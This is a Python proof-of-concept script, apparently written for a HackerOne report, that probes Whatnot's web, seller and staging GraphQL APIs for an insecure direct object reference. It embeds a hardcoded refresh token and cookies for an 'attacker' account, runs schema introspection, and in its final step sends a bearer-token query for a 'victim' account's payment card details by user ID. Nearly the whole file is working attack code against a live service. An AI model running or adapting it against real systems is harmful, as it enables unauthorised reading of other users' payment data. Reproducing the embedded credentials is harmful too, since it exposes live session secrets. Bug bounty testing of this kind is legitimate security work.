#!/usr/bin/env python3
"""
Run this on your Mac: python3 run_evidence.py
No arguments needed — cookies are embedded and auto-refreshed.
"""
import requests, json, sys
from datetime import datetime

WEB_GQL    = "https://www.whatnot.com/services/graphql/"
SELLER_GQL = "https://api.whatnot.com/seller-api/graphql"
STAGE_GQL  = "https://api.stage.whatnot.com/seller-api/graphql"

ATTACKER_ID   = "58968022"
ATTACKER_USER = "anyakoa"
VICTIM_ID     = "58968144"
VICTIM_USER   = "anyako0810"

REFRESH_TOKEN = (
    "eyJhbGciOiJFZERTQSIsImtpZCI6IndoYXRub3QtcmVmcmVzaC1wcm9kLTEiLCJ0eXAiOiJKV1QifQ"
    ".eyJzdWIiOjU4OTY4MDIyLCJpc3MiOiJ3aGF0bm90L2F1dGgiLCJhdWQiOiJ3aGF0bm90L3JlZnJlc2gi"
    "LCJleHAiOjE4MTE5MjI1MDUsImlhdCI6MTc4MDM4NjUwNSwibmJmIjoxNzgwMzg2NTA1LCJqdGkiOiI2"
    "RmhhYUl4QWZTMDNfajQyV2tyY25RIiwiYXBwc2lkIjoiYWEzOThhN2UtOGZiMy00MjJjLWE4MzktYjNk"
    "YTFiMjQ5MTY2IiwidXByIjoxLjAsInNlc3Npb25fdG9rZW4iOiJ3bl9ydF9INjduUXR1MEZ6RHl3U19k"
    "MWxOQzpnZ3Nod2F6MWJwOWtDZ1ZNRzZnUyJ9"
    ".cAZlt0Wk-LEeqprfuOMvzPtHqQRUv74iRrasC6T8kSSketLPwnSZxPdOSxi9AiZjp640ggoIYbDVrxCDBtmwCA"
)

STATIC_COOKIES = (
    "stable-id=fcdd7ff3-1878-46ed-8469-725bdcce7b94; "
    "__Secure-refresh-token=" + REFRESH_TOKEN
)

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Origin": "https://www.whatnot.com",
    "Referer": "https://www.whatnot.com/",
    "Accept": "application/json, */*",
    "Accept-Language": "en-US,en;q=0.9",
}

results = []

def log(msg):
    print(msg)
    results.append(msg)

def gql(url, query, cookie_str=None, bearer=None):
    h = dict(HEADERS)
    if cookie_str:
        h["Cookie"] = cookie_str
    if bearer:
        h["Authorization"] = f"Bearer {bearer}"
    try:
        r = requests.post(url, json={"query": query}, headers=h, timeout=15)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"_raw": r.text[:300]}
    except Exception as e:
        return 0, {"_error": str(e)}

def refresh_access_token():
    """Use the refresh token to get a new short-lived access token."""
    h = dict(HEADERS)
    h["Cookie"] = f"__Secure-refresh-token={REFRESH_TOKEN}"
    h["Authorization"] = "Cookie"
    try:
        r = requests.post("https://www.whatnot.com/services/api/v2/refresh",
                          json={}, headers=h, timeout=15)
        log(f"  Refresh endpoint: HTTP {r.status_code}")
        if r.status_code == 200:
            # new access token comes back as a Set-Cookie
            new_access = None
            for sc in r.headers.get("Set-Cookie", "").split(","):
                if "__Secure-access-token=" in sc:
                    new_access = sc.split("__Secure-access-token=")[1].split(";")[0].strip()
            if new_access:
                log(f"  Got fresh access token (len={len(new_access)})")
                return new_access
        log(f"  Refresh body: {r.text[:200]}")
    except Exception as e:
        log(f"  Refresh error: {e}")
    return None


def main():
    log("=" * 60)
    log(f"  Whatnot IDOR Evidence Run — {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}")
    log(f"  Attacker: {ATTACKER_USER} ({ATTACKER_ID})")
    log(f"  Victim:   {VICTIM_USER} ({VICTIM_ID})")
    log("=" * 60)

    # ── refresh access token ──────────────────────────────────────────────────
    log("\n[*] Refreshing access token...")
    new_access = refresh_access_token()
    if new_access:
        full_cookie = STATIC_COOKIES + f"; __Secure-access-token={new_access}"
    else:
        log("  Could not refresh — will try with refresh token cookie only")
        full_cookie = STATIC_COOKIES

    # ── Evidence A: staging API public ───────────────────────────────────────
    log("\n=== Evidence A: Staging API publicly reachable ===")
    code, body = gql(STAGE_GQL, "{ __typename }")
    log(f"  HTTP {code}  body={str(body)[:100]}")
    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else f'HTTP {code}'}")

    # ── Evidence B: prod Seller API ───────────────────────────────────────────
    log("\n=== Evidence B: Production Seller API exists ===")
    code, body = gql(SELLER_GQL, "{ __typename }")
    log(f"  HTTP {code}  body={str(body)[:100]}")
    log(f"  Result: {'PASS — endpoint live, returns 401' if code == 401 else f'HTTP {code}'}")

    # ── Evidence C: cards field on UserNode ───────────────────────────────────
    log("\n=== Evidence C: 'cards' field on UserNode schema ===")
    q = '{ __type(name: "UserNode") { fields { name } } }'
    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
    log(f"  HTTP {code}")
    if code == 200:
        fields = [f["name"] for f in body.get("data", {}).get("__type", {}).get("fields", [])]
        payment = [f for f in fields if any(k in f.lower() for k in ["card","payment","billing","wallet"])]
        log(f"  Payment-related fields: {payment}")
        log(f"  'cards' present: {'cards' in fields}")
        log(f"  Result: {'PASS' if 'cards' in fields else 'FAIL'}")
    else:
        log(f"  body={str(body)[:200]}")
        log("  Result: FAIL — not authenticated")

    # ── Evidence D: me.cards ──────────────────────────────────────────────────
    log("\n=== Evidence D: me.cards returns own payment card data ===")
    q = ('{ me { id username cards(first:5) { edges { node '
         '{ id cardDescription cardType gateway } } } } }')
    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
    log(f"  HTTP {code}")
    if code == 200:
        me = body.get("data", {}).get("me")
        if me:
            edges = me.get("cards", {}).get("edges", [])
            log(f"  Logged in as: {me.get('username')} (id={me.get('id')})")
            log(f"  Cards returned: {len(edges)}")
            for e in edges:
                n = e.get("node", {})
                log(f"    card: type={n.get('cardType')}  desc={n.get('cardDescription')}  gateway={n.get('gateway')}")
            log(f"  Result: PASS")
        else:
            log(f"  me: null — session invalid. body={str(body)[:200]}")
            log("  Result: FAIL")
    else:
        log(f"  body={str(body)[:200]}")
        log("  Result: FAIL")

    # ── Evidence E: user(id:) blocked on web ──────────────────────────────────
    log("\n=== Evidence E: user(id:) blocked on web GraphQL ===")
    q = f'{{ user(id: "{VICTIM_ID}") {{ id }} }}'
    code, body = gql(WEB_GQL, q, cookie_str=full_cookie)
    log(f"  HTTP {code}  body={json.dumps(body)[:300]}")
    errors = body.get("errors", [])
    blocked = any("Cannot query field" in e.get("message","") for e in errors)
    log(f"  Result: {'PASS — correctly blocked' if blocked else 'UNEXPECTED'}")

    # ── Evidence F: Seller API with web JWT as Bearer ─────────────────────────
    log("\n=== Evidence F: Seller API — try web JWT as Bearer ===")
    if new_access:
        q = '{ __type(name: "Query") { fields { name } } }'
        code, body = gql(SELLER_GQL, q, bearer=new_access)
        log(f"  HTTP {code}  body={str(body)[:300]}")
        if code == 200:
            fields = [f["name"] for f in body.get("data",{}).get("__type",{}).get("fields",[])]
            log(f"  Query fields: {fields}")
            log(f"  'user' field present: {'user' in fields}")
            log("  Result: AUTHENTICATED — Seller API accepts web JWT!")
        else:
            log(f"  Result: HTTP {code} — web JWT rejected by Seller API (expected)")
    else:
        log("  Skipped — no fresh access token")

    # ── Evidence G: live IDOR ─────────────────────────────────────────────────
    log("\n=== Evidence G: Live IDOR — Account A reads Account B's cards ===")
    if new_access:
        q = (f'{{ user(id: "{VICTIM_ID}") '
             f'{{ id username cards(first:10) '
             f'{{ edges {{ node {{ id cardDescription cardType gateway }} }} }} }} }}')
        code, body = gql(SELLER_GQL, q, bearer=new_access)
        log(f"  HTTP {code}  body={str(body)[:400]}")
        if code == 200:
            user_data = body.get("data", {}).get("user")
            if user_data:
                edges = user_data.get("cards", {}).get("edges", [])
                if edges:
                    log(f"  *** IDOR CONFIRMED — victim cards visible: {edges} ***")
                else:
                    log(f"  user returned but no cards: {user_data}")
            else:
                log(f"  No user data in response")
        else:
            log(f"  Result: HTTP {code} — Seller API auth required (web JWT not accepted)")
    else:
        log("  Skipped — no fresh access token")

    # ── save output ───────────────────────────────────────────────────────────
    outfile = "evidence_results.txt"
    with open(outfile, "w") as f:
        f.write("\n".join(results))
    log(f"\n[+] Results saved to {outfile}")
    log("    Screenshot this terminal and attach to your HackerOne report.\n")

if __name__ == "__main__":
    main()
